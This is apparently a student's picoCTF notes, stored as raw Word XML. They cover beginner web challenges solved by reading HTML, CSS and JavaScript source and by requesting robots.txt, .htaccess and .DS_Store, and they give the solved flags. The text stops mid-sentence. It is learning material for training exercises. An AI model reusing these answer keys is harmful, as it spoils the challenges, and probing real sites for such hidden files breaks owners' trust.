      </w:pPr>
      <w:r w:rsidRPr="00CD17CC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D6E37C" w14:textId="36E1B841" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C6675E6" w14:textId="51C5BBB1" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36A41F1F"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Search source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514AB882"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A9541AC"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B053349"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18D3C27"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2498CB2" w14:textId="51E43F37"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developer of this website mistakenly left an important artifact in the website source, can you find it?The website is </w:t>
      </w:r>
      <w:hyperlink r:id="rId58" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C5A10DA" w14:textId="66454CF1"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p>
    <w:p w14:paraId="0BA599E9" w14:textId="012AFEEC"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4C57A12" wp14:editId="263CAFA4">
            <wp:extent cx="6332220" cy="338455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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3384550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="69825D21" w14:textId="7BF7F45B"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270EF0C" wp14:editId="318F6CD6">
            <wp:extent cx="3475021" cy="95258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3475021" cy="952583"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7266465C" w14:textId="58A628A3"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
    <w:p w14:paraId="02D784EA" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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Includes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2112B4E4"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5B244ED"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Exploitationinspector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030B2E7D" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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032496" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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69F6AA9" w14:textId="372FA76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get the flag?Go to this </w:t>
      </w:r>
      <w:hyperlink r:id="rId61"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3A3711CF" w14:textId="6DB30CC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08FE6C04" w14:textId="1B92282D"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lastRenderedPageBreak/>
        <w:t>style.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287B8C35"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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BE833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background-color: lightblue;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BC3356" w14:textId="4CF57F52" w:rsid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1224A9A"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00A5517" w14:textId="2D2704F2"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script.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614D69D2" w14:textId="3F48274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picoCTF{1nclu51v17y_1of2_  */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E17E9D2" w14:textId="0671F004"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78105D2B"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function greetings()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D33581"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FB86B82"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alert("This code is in a separate file!");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3101254E"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1400FB5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C116AF2" w14:textId="6EDA6E7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f7w_2of2_6edef411}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7971E0BC" w14:textId="372057F0"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picoCTF{1nclu51v17y_1of2_f7w_2of2_6edef411}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BE458D" w14:textId="5AEC8624" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EE2F516" w14:textId="23E116F3" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40F10EDA" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E8406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dont-use-client-side</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD398A2"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2937E15"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Tags: picoCTF 2019Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F58AF98" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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ALEX FULTON/DANNY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58550407" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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0886805" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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break into this super secure portal? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/37821/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId62"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http://jupiter.challenges.picoctf.org:37821</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3A2679" w14:textId="0AE29A4C" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3245FAC6" w14:textId="41B25B5E" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7267EC07" w14:textId="1CA57A96" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50D23ED7" wp14:editId="2CC1A6EF">
            <wp:extent cx="6271803" cy="5098222"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6271803" cy="5098222"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="135C89F0" w14:textId="60246D90" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0DBD70" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>if (checkpass.substring(0, split) == 'pico') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59297DF4" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">      if (checkpass.substring(split*6, split*7) == 'a3c8') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D1D4AE" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        if (checkpass.substring(split, split*2) == 'CTF{') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D8E549" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">         if (checkpass.substring(split*4, split*5) == 'ts_p') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E105B4" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">          if (checkpass.substring(split*3, split*4) == 'lien') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A4783F" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">            if (checkpass.substring(split*5, split*6) == 'lz_1') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA5E905" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">              if (checkpass.substring(split*2, split*3) == </w:t>
      </w:r>
      <w:bookmarkStart w:id="46" w:name="_Hlk112456791"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'no_c'</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E94061" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">                if (checkpass.substring(split*7, split*8) == '9}') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708C220C" w14:textId="7401E98B" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  alert("Password Verified")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0869676B" w14:textId="4574D993" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{no_clients_plz_1a3c89}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECBB0B3" w14:textId="574683C4" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A7B12A8" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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Scavenger Hunt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E877FF0"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4F43E9E9"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7B7173AC" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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4A6F7A21" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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1AD2C84" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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some interesting information hidden around this site </w:t>
      </w:r>
      <w:hyperlink r:id="rId64" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:44070/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>. Can you find it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4739CDA5" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BBB283B" w14:textId="0954A539" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14404989" w14:textId="302E8BE4" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!-- Here's the first part of the flag: </w:t>
      </w:r>
      <w:r w:rsidR="008B4ABA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF{t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0529310B" w14:textId="3E515361" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B28E174" w14:textId="6A7E115D" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2</w:t>
      </w:r>
      <w:bookmarkStart w:id="47" w:name="_Hlk112457559"/>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">: h4ts_4_l0 </w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016D1127" w14:textId="0534BDCC" w:rsidR="006F3074" w:rsidRDefault="006F3074" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698A5DDD" w14:textId="78A3D5C3" w:rsidR="006F3074" w:rsidRDefault="006F3074" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006F3074">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/* How can I keep Google from indexing my website? */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404C854A" w14:textId="52A22DA4" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32BDCA8A" w14:textId="1C9EA131" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="292929"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>• Okay HOW??? Well, I did a bit of googling over here, according to google I read that you can use robots.txt file to manage crawler traffic to the site and also to keep a file off Google but it depends on the file type.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64373546" w14:textId="383BD5AF" w:rsidR="008B4ABA" w:rsidRDefault="00000000" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId65" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="008B4ABA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:44070/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F68818" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRPr="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>User-agent: *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CFD8FB" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRPr="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Disallow: /index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C41456" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRPr="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># Part 3: t_0f_pl4c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F2555B" w14:textId="48BDB194" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># I think this is an apache server... can you Access the next flag?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E0E584" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="1B1B1B"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t>Apache Configuration: .htaccess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D1DD70" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="1B1B1B"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t>Apache .htaccess files allow users to configure directories of the web server they control without modifying the main configuration file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10708A7D" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16FDA5AE" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BC9B8AA" w14:textId="206FD783" w:rsidR="00E217C1" w:rsidRDefault="00000000" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId66" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00E217C1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:44070/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>.htaccess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAD9BD8" w14:textId="487DA3B1" w:rsidR="00E217C1" w:rsidRPr="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"># Part 4: </w:t>
      </w:r>
      <w:bookmarkStart w:id="48" w:name="_Hlk112457957"/>
      <w:r w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>3s_2_lO0k</w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
    </w:p>
    <w:p w14:paraId="3052538F" w14:textId="32407C4B" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># I love making websites on my Mac, I can Store a lot of information there.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBA9F1B" w14:textId="6C8F6867" w:rsidR="00E217C1" w:rsidRDefault="005047B5" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>What stands out the most about that hint is the capitalized "Store". In Macs, a .DS_Store file stores the configurations for how the desktop looks (eg. icon location, etc.) Changing .htacess with .DS_Store got</w:t>
      </w:r>
    </w:p>
